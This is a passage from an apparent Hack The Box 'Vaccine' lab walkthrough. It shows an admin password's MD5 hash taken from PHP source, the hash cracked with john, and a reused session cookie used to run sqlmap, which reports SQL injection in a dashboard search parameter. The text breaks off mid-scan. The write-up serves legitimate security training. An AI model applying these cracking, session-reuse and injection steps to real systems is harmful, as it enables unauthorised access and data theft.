</span></span><span class=line><span class=cl>  &lt;svg <span class=nv>xmlns</span><span class=o>=</span><span class=s2>&#34;http://www.w3.org/2000/svg&#34;</span> <span class=nv>class</span><span class=o>=</span><span class=s2>&#34;icons&#34;</span>&gt;&lt;symbol <span class=nv>id</span><span class=o>=</span><span class=s2>&#34;arrow-right&#34;</span> <span class=nv>viewBox</span><span class=o>=</span><span class=s2>&#34;0 0 1792 1792&#34;</span>&gt;&lt;path <span class=nv>d</span><span class=o>=</span><span class=s2>&#34;M1600 960q0 54-37 91l-651 651q-39 37-91 37-51 0-90-37l-75-75q-38-38-38-91t38-91l293-293H245q-52 0-84.5-37.5T128 1024V896q0-53 32.5-90.5T245 768h704L656 474q-38-36-38-90t38-90l75-75q38-38 90-38 53 0 91 38l651 651q37 35 37 90z&#34;</span>/&gt;&lt;/symbol&gt;&lt;symbol <span class=nv>id</span><span class=o>=</span><span class=s2>&#34;lock&#34;</span> <span class=nv>viewBox</span><span class=o>=</span><span class=s2>&#34;0 0 1792 1792&#34;</span>&gt;&lt;path <span class=nv>d</span><span class=o>=</span><span class=s2>&#34;M640 768h512V576q0-106-75-181t-181-75-181 75-75 181v192zm832 96v576q0 40-28 68t-68 28H416q-40 0-68-28t-28-68V864q0-40 28-68t68-28h32V576q0-184 132-316t316-132 316 132 132 316v192h32q40 0 68 28t28 68z&#34;</span>/&gt;&lt;/symbol&gt;&lt;symbol <span class=nv>id</span><span class=o>=</span><span class=s2>&#34;user&#34;</span> <span class=nv>viewBox</span><span class=o>=</span><span class=s2>&#34;0 0 1792 1792&#34;</span>&gt;&lt;path <span class=nv>d</span><span class=o>=</span><span class=s2>&#34;M1600 1405q0 120-73 189.5t-194 69.5H459q-121 0-194-69.5T192 1405q0-53 3.5-103.5t14-109T236 1084t43-97.5 62-81 85.5-53.5T538 832q9 0 42 21.5t74.5 48 108 48T896 971t133.5-21.5 108-48 74.5-48 42-21.5q61 0 111.5 20t85.5 53.5 62 81 43 97.5 26.5 108.5 14 109 3.5 103.5zm-320-893q0 159-112.5 271.5T896 896 624.5 783.5 512 512t112.5-271.5T896 128t271.5 112.5T1280 512z&#34;</span>/&gt;&lt;/symbol&gt;&lt;/svg&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;/body&gt;
</span></span><span class=line><span class=cl>&lt;!-- partial --&gt;
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>&lt;/body&gt;
</span></span><span class=line><span class=cl>&lt;/html&gt;
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.12<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-bigt2wisms<span class=o>]</span>─<span class=o>[</span>~/vaccine<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>The part in the beginning</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>...</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;password&#39;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>]</span> <span class=o>===</span> <span class=s1>&#39;admin&#39;</span> <span class=o>&amp;&amp;</span> <span class=nx>md5</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;password&#39;</span><span class=p>])</span> <span class=o>===</span> <span class=s2>&#34;2cb42f8734ea607eefed3b70af13bbd3&#34;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;login&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=s2>&#34;true&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=nx>header</span><span class=p>(</span><span class=s2>&#34;Location: dashboard.php&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=o>...</span>
</span></span></code></pre></div><p>definitely stands out.</p><p>Simply put: if any <strong>password</strong> is used for the <em>admin</em> user and if that <strong>password&rsquo;s</strong> <em><strong>md5-hash</strong></em> equals - <em>2cb42f8734ea607eefed3b70af13bbd3</em> -, we are <strong>allowed access</strong> and redirected to - <em>dashboard.php</em> -.</p><p>Looking at the other file - <em>style.css</em> -</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.12<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-bigt2wisms<span class=o>]</span>─<span class=o>[</span>~/vaccine<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ cat style.css 
</span></span><span class=line><span class=cl>/* config.css */
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>/* helpers/align.css */
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>.align <span class=o>{</span>
</span></span><span class=line><span class=cl>  -webkit-box-align: center<span class=p>;</span>
</span></span><span class=line><span class=cl>      -ms-flex-align: center<span class=p>;</span>
</span></span><span class=line><span class=cl>          align-items: center<span class=p>;</span>
</span></span><span class=line><span class=cl>  display: -webkit-box<span class=p>;</span>
</span></span><span class=line><span class=cl>  display: -ms-flexbox<span class=p>;</span>
</span></span><span class=line><span class=cl>  display: flex<span class=p>;</span>
</span></span><span class=line><span class=cl>  -webkit-box-orient: vertical<span class=p>;</span>
</span></span><span class=line><span class=cl>  -webkit-box-direction: normal<span class=p>;</span>
</span></span><span class=line><span class=cl>      -ms-flex-direction: column<span class=p>;</span>
</span></span><span class=line><span class=cl>          flex-direction: column<span class=p>;</span>
</span></span><span class=line><span class=cl>  -webkit-box-pack: center<span class=p>;</span>
</span></span><span class=line><span class=cl>      -ms-flex-pack: center<span class=p>;</span>
</span></span><span class=line><span class=cl>          justify-content: center<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>/* helpers/grid.css */
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>/* modules/text.css */
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>p <span class=o>{</span>
</span></span><span class=line><span class=cl>  margin-bottom: 24px<span class=p>;</span>
</span></span><span class=line><span class=cl>  margin-bottom: 1.5rem<span class=p>;</span>
</span></span><span class=line><span class=cl>  margin-top: 24px<span class=p>;</span>
</span></span><span class=line><span class=cl>  margin-top: 1.5rem<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>.text--center <span class=o>{</span>
</span></span><span class=line><span class=cl>  text-align: center<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.12<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-bigt2wisms<span class=o>]</span>─<span class=o>[</span>~/vaccine<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>except maybe the mentioning of some interesting locations like - * modules/text.css * -, nothing really stands out.</p><blockquote><p>zip2john</p></blockquote><h2 id=task-5><strong>TASK 5</strong><a hidden class=anchor aria-hidden=true href=#task-5>#</a></h2><p><strong>Question</strong>: <em>What is the password for the admin user on the website?</em></p><p>To answer the question, first we have to <strong>save</strong> the <strong>md5 hash</strong> we found in TASK4.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.12<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-bigt2wisms<span class=o>]</span>─<span class=o>[</span>~/vaccine<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ <span class=nb>echo</span> -n <span class=s2>&#34;2cb42f8734ea607eefed3b70af13bbd3&#34;</span> &gt; md5hash
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.12<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-bigt2wisms<span class=o>]</span>─<span class=o>[</span>~/vaccine<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ cat md5hash 
</span></span><span class=line><span class=cl>2cb42f8734ea607eefed3b70af13bbd3┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.12<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-bigt2wisms<span class=o>]</span>─<span class=o>[</span>~/vaccine<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>Then we use <em><strong>john</strong></em> (again) to <strong>crack</strong> it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.12<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-bigt2wisms<span class=o>]</span>─<span class=o>[</span>~/vaccine<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ john --format<span class=o>=</span>raw-md5 --wordlist<span class=o>=</span>/usr/share/wordlists/rockyou.txt md5hash 
</span></span><span class=line><span class=cl>Using default input encoding: UTF-8
</span></span><span class=line><span class=cl>Loaded <span class=m>1</span> password <span class=nb>hash</span> <span class=o>(</span>Raw-MD5 <span class=o>[</span>MD5 256/256 AVX2 8x3<span class=o>])</span>
</span></span><span class=line><span class=cl>Warning: no OpenMP support <span class=k>for</span> this <span class=nb>hash</span> type, consider --fork<span class=o>=</span><span class=m>4</span>
</span></span><span class=line><span class=cl>Press <span class=s1>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class=k>for</span> status
</span></span><span class=line><span class=cl>qwerty789        <span class=o>(</span>?<span class=o>)</span>
</span></span><span class=line><span class=cl>1g 0:00:00:00 DONE <span class=o>(</span>2023-05-18 03:27<span class=o>)</span> 16.66g/s 1670Kp/s 1670Kc/s 1670KC/s shunda..pogimo
</span></span><span class=line><span class=cl>Use the <span class=s2>&#34;--show --format=Raw-MD5&#34;</span> options to display all of the cracked passwords reliably
</span></span><span class=line><span class=cl>Session completed
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.12<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-bigt2wisms<span class=o>]</span>─<span class=o>[</span>~/vaccine<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ john --show --format<span class=o>=</span>Raw-MD5 md5hash 
</span></span><span class=line><span class=cl>?:qwerty789
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=m>1</span> password <span class=nb>hash</span> cracked, <span class=m>0</span> left
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.12<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-bigt2wisms<span class=o>]</span>─<span class=o>[</span>~/vaccine<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><blockquote><p>qwerty789</p></blockquote><h2 id=task-6><strong>TASK 6</strong><a hidden class=anchor aria-hidden=true href=#task-6>#</a></h2><p><strong>Question</strong>: <em>What option can be passed to sqlmap to try to get command execution via the sql injection?</em></p><p>It&rsquo;s well past the time that we checked out the webpage which target hosts. Once we call up - <em>http://$rhost/</em> - in our <strong>browser</strong>, we are welcomed with a log in page.</p><p><img loading=lazy src=/walkthroughs/htb/starting-point/tier_2/vaccine/webpage.png alt=webpage title=webpage></p><p>Using the <strong>credentials</strong> we <strong>obtained</strong> in TASK4 and TASK5</p><table><thead><tr><th>obtained credentials</th><th></th></tr></thead><tbody><tr><td><em>username</em></td><td style=text-align:left>admin</td></tr><tr><td><em>password</em></td><td style=text-align:left>qwerty789</td></tr></tbody></table><p>we log in. We might notice, that once logged in we are directly redirected to - <em>http://$rhost/dashboard.php</em> -.</p><p><img loading=lazy src=/walkthroughs/htb/starting-point/tier_2/vaccine/webpage-post-login.png alt=webpage-post-login title=webpage-post-login></p><p>Moreover, after goofing around a bit, we notice, that every word we <strong>search for</strong> with the search field gets <strong>reflected</strong> in the <em><strong>url</strong></em> <em>search</em> parameter.</p><p><img loading=lazy src=/walkthroughs/htb/starting-point/tier_2/vaccine/search-test.png alt=search-test title=search-test></p><p>Since these kinds of search fields are quite often prone to <strong>sql injection attacks</strong> - and given the question explicitly mentioning <em><strong>sqlmap</strong></em> as the tool we should look up - we do exactly that, we check it out.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.12<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-bigt2wisms<span class=o>]</span>─<span class=o>[</span>~/vaccine<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ sqlmap --help
</span></span><span class=line><span class=cl>        ___
</span></span><span class=line><span class=cl>       __H__
</span></span><span class=line><span class=cl> ___ ___<span class=o>[</span><span class=s1>&#39;]_____ ___ ___  {1.6.12#stable}
</span></span></span><span class=line><span class=cl><span class=s1>|_ -| . [&#39;</span><span class=o>]</span>     <span class=p>|</span> .<span class=s1>&#39;| . |
</span></span></span><span class=line><span class=cl><span class=s1>|___|_  [&#34;]_|_|_|__,|  _|
</span></span></span><span class=line><span class=cl><span class=s1>      |_|V...       |_|   https://sqlmap.org
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>Usage: python3 sqlmap [options]
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>Options:
</span></span></span><span class=line><span class=cl><span class=s1>  -h, --help            Show basic help message and exit
</span></span></span><span class=line><span class=cl><span class=s1>  -hh                   Show advanced help message and exit
</span></span></span><span class=line><span class=cl><span class=s1>  --version             Show program&#39;</span>s version number and <span class=nb>exit</span>
</span></span><span class=line><span class=cl>  -v VERBOSE            Verbosity level: 0-6 <span class=o>(</span>default 1<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  Target:
</span></span><span class=line><span class=cl>    At least one of these options has to be provided to define the
</span></span><span class=line><span class=cl>    target<span class=o>(</span>s<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    -u URL, --url<span class=o>=</span>URL   Target URL <span class=o>(</span>e.g. <span class=s2>&#34;http://www.site.com/vuln.php?id=1&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>    -g GOOGLEDORK       Process Google dork results as target URLs
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  Request:
</span></span><span class=line><span class=cl>    These options can be used to specify how to connect to the target URL
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    --data<span class=o>=</span>DATA         Data string to be sent through POST <span class=o>(</span>e.g. <span class=s2>&#34;id=1&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>    --cookie<span class=o>=</span>COOKIE     HTTP Cookie header value <span class=o>(</span>e.g. <span class=s2>&#34;PHPSESSID=a8d127e..&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>    --random-agent      Use randomly selected HTTP User-Agent header value
</span></span><span class=line><span class=cl>    --proxy<span class=o>=</span>PROXY       Use a proxy to connect to the target URL
</span></span><span class=line><span class=cl>    --tor               Use Tor anonymity network
</span></span><span class=line><span class=cl>    --check-tor         Check to see <span class=k>if</span> Tor is used properly
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  Operating system access:
</span></span><span class=line><span class=cl>    These options can be used to access the back-end database management
</span></span><span class=line><span class=cl>    system underlying operating system
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    --os-shell          Prompt <span class=k>for</span> an interactive operating system shell
</span></span><span class=line><span class=cl>    --os-pwn            Prompt <span class=k>for</span> an OOB shell, Meterpreter or VNC
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  General:
</span></span><span class=line><span class=cl>    These options can be used to <span class=nb>set</span> some general working parameters
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    --batch             Never ask <span class=k>for</span> user input, use the default behavior
</span></span><span class=line><span class=cl>    --flush-session     Flush session files <span class=k>for</span> current target
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  Miscellaneous:
</span></span><span class=line><span class=cl>    These options <span class=k>do</span> not fit into any other category
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    --wizard            Simple wizard interface <span class=k>for</span> beginner users
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.12<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-bigt2wisms<span class=o>]</span>─<span class=o>[</span>~/vaccine<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>Looking over the tool&rsquo;s <strong>options</strong> will provide us with both the task&rsquo;s <strong>answer</strong> and a little <strong>hint</strong> about the next direction we should head towards.</p><p>So our next course of action is to use <em><strong>sqlmap</strong></em> to determine if the <strong>target</strong> website is vulnerable to <strong>sql injection</strong> or not.</p><p>Trying to run it with only the <strong>url</strong> being specified will not work considering we forgot to provide any <strong>credentials</strong> or <strong>authentication data</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.12<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-bigt2wisms<span class=o>]</span>─<span class=o>[</span>~/vaccine<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ sqlmap -u http://10.129.94.247/dashboard.php?search<span class=o>=</span><span class=nb>test</span>
</span></span><span class=line><span class=cl>        ___
</span></span><span class=line><span class=cl>       __H__
</span></span><span class=line><span class=cl> ___ ___<span class=o>[</span><span class=s1>&#39;]_____ ___ ___  {1.6.12#stable}
</span></span></span><span class=line><span class=cl><span class=s1>|_ -| . [(]     | .&#39;</span><span class=p>|</span> . <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span>___<span class=p>|</span>_  <span class=o>[</span>,<span class=o>]</span>_<span class=p>|</span>_<span class=p>|</span>_<span class=p>|</span>__,<span class=p>|</span>  _<span class=p>|</span>
</span></span><span class=line><span class=cl>      <span class=p>|</span>_<span class=p>|</span>V...       <span class=p>|</span>_<span class=p>|</span>   https://sqlmap.org
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>!<span class=o>]</span> legal disclaimer: Usage of sqlmap <span class=k>for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class=s1>&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>[*] starting @ 04:09:30 /2023-05-18/
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>[04:09:31] [INFO] testing connection to the target URL
</span></span></span><span class=line><span class=cl><span class=s1>got a 302 redirect to &#39;</span>http://10.129.94.247:80/index.php<span class=s1>&#39;. Do you want to follow? [Y/n] n
</span></span></span><span class=line><span class=cl><span class=s1>you have not declared cookie(s), while server wants to set its own (&#39;</span><span class=nv>PHPSESSID</span><span class=o>=</span>f4j6ae5ahkv...a47gj2eidd<span class=err>&#39;</span><span class=o>)</span>. Do you want to use those <span class=o>[</span>Y/n<span class=o>]</span> n
</span></span></code></pre></div><p>One way to rectify this is to simply copy the <strong>cookie data</strong> from our <strong>authenticated</strong> browser <strong>session</strong> (already logged in). We can grab the <strong>cookie information</strong> by heading to</p><p><em><strong>Web Developer Tools</strong></em> -> Storage -> Cookies -> - <em>http://$rhost</em> -</p><p><img loading=lazy src=/walkthroughs/htb/starting-point/tier_2/vaccine/cookie.png alt=cookie title=cookie></p><p>and then using the <em>--cookie=COOKIE</em> <strong>option</strong> to get an <strong>authorized session</strong>. It is important to take note of the modification to the cookie&rsquo;s format:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># before</span>
</span></span><span class=line><span class=cl>PHPSESSID:<span class=s2>&#34;28ivthf91jm4d05jrcl09d0k7a&#34;</span>
</span></span><span class=line><span class=cl><span class=c1># after</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;PHPSESSID=28ivthf91jm4d05jrcl09d0k7a&#34;</span>
</span></span></code></pre></div><p>Once run, it reports that the <em>search</em> <strong>url</strong> <strong>parameter</strong> is indeed <strong>vulnerable</strong> to <strong>sql injection</strong>. It even provides us with some example <strong>payloads</strong> we could then use to exploit this weakness.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.12<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-bigt2wisms<span class=o>]</span>─<span class=o>[</span>~/vaccine<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ sqlmap -u http://10.129.94.247/dashboard.php?search<span class=o>=</span><span class=nb>test</span> --cookie<span class=o>=</span><span class=s2>&#34;PHPSESSID=28ivthf91jm4d05jrcl09d0k7a&#34;</span>
</span></span><span class=line><span class=cl>        ___
</span></span><span class=line><span class=cl>       __H__
</span></span><span class=line><span class=cl> ___ ___<span class=o>[</span><span class=s2>&#34;]_____ ___ ___  {1.6.12#stable}
</span></span></span><span class=line><span class=cl><span class=s2>|_ -| . [&#34;</span><span class=o>]</span>     <span class=p>|</span> .<span class=s1>&#39;| . |
</span></span></span><span class=line><span class=cl><span class=s1>|___|_  [)]_|_|_|__,|  _|
</span></span></span><span class=line><span class=cl><span class=s1>      |_|V...       |_|   https://sqlmap.org
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;</span>s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible <span class=k>for</span> any misuse or damage caused by this program
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> starting @ 04:28:03 /2023-05-18/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>04:28:03<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> testing connection to the target URL
</span></span><span class=line><span class=cl><span class=o>[</span>04:28:03<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> testing <span class=k>if</span> the target URL content is stable
</span></span><span class=line><span class=cl><span class=o>[</span>04:28:04<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> target URL content is stable
</span></span><span class=line><span class=cl><span class=o>[</span>04:28:04<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> testing <span class=k>if</span> GET parameter <span class=s1>&#39;search&#39;</span> is dynamic
</span></span><span class=line><span class=cl><span class=o>[</span>04:28:04<span class=o>]</span> <span class=o>[</span>WARNING<span class=o>]</span> GET parameter <span class=s1>&#39;search&#39;</span> does not appear to be dynamic
</span></span><span class=line><span class=cl><span class=o>[</span>04:28:04<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> heuristic <span class=o>(</span>basic<span class=o>)</span> <span class=nb>test</span> shows that GET parameter <span class=s1>&#39;search&#39;</span> might be injectable <span class=o>(</span>possible DBMS: <span class=s1>&#39;PostgreSQL&#39;</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>04:28:04<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> heuristic <span class=o>(</span>XSS<span class=o>)</span> <span class=nb>test</span> shows that GET parameter <span class=s1>&#39;search&#39;</span> might be vulnerable to cross-site scripting <span class=o>(</span>XSS<span class=o>)</span> attacks
</span></span><span class=line><span class=cl><span class=o>[</span>04:28:04<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> testing <span class=k>for</span> SQL injection on GET parameter <span class=s1>&#39;search&#39;</span>
</span></span><span class=line><span class=cl>it looks like the back-end DBMS is <span class=s1>&#39;PostgreSQL&#39;</span>. Do you want to skip <span class=nb>test</span> payloads specific <span class=k>for</span> other DBMSes? <span class=o>[</span>Y/n<span class=o>]</span> Y
</span></span><span class=line><span class=cl><span class=k>for</span> the remaining tests, <span class=k>do</span> you want to include all tests <span class=k>for</span> <span class=s1>&#39;PostgreSQL&#39;</span> extending provided level <span class=o>(</span>1<span class=o>)</span> and risk <span class=o>(</span>1<span class=o>)</span> values? <span class=o>[</span>Y/n<span class=o>]</span> Y
</span></span><span class=line><span class=cl><span class=o>[</span>04:28:32<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> testing <span class=s1>&#39;AND boolean-based blind - WHERE or HAVING clause&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>04:28:33<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> testing <span class=s1>&#39;Boolean-based blind - Parameter replace (original value)&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>04:28:33<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> testing <span class=s1>&#39;Generic inline queries&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>04:28:33<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> testing <span class=s1>&#39;PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>04:28:33<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> GET parameter <span class=s1>&#39;search&#39;</span> appears to be <span class=s1>&#39;PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)&#39;</span> injectable 
</span></span><span class=line><span class=cl><span class=o>[</span>04:28:33<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> testing <span class=s1>&#39;PostgreSQL AND error-based - WHERE or HAVING clause&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>04:28:33<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> GET parameter <span class=s1>&#39;search&#39;</span> is <span class=s1>&#39;PostgreSQL AND error-based - WHERE or HAVING clause&#39;</span> injectable 
</span></span><span class=line><span class=cl><span class=o>[</span>04:28:33<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> testing <span class=s1>&#39;PostgreSQL inline queries&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>04:28:33<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> testing <span class=s1>&#39;PostgreSQL &gt; 8.1 stacked queries (comment)&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>04:28:33<span class=o>]</span> <span class=o>[</span>WARNING<span class=o>]</span> time-based comparison requires larger statistical model, please wait....... <span class=o>(</span><span class=k>done</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>04:28:43<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> GET parameter <span class=s1>&#39;search&#39;</span> appears to be <span class=s1>&#39;PostgreSQL &gt; 8.1 stacked queries (comment)&#39;</span> injectable 
</span></span><span class=line><span class=cl><span class=o>[</span>04:28:43<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> testing <span class=s1>&#39;PostgreSQL &gt; 8.1 AND time-based blind&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>04:28:53<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> GET parameter <span class=s1>&#39;search&#39;</span> appears to be <span class=s1>&#39;PostgreSQL &gt; 8.1 AND time-based blind&#39;</span> injectable 
</span></span><span class=line><span class=cl><span class=o>[</span>04:28:53<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> testing <span class=s1>&#39;Generic UNION query (NULL) - 1 to 20 columns&#39;</span>
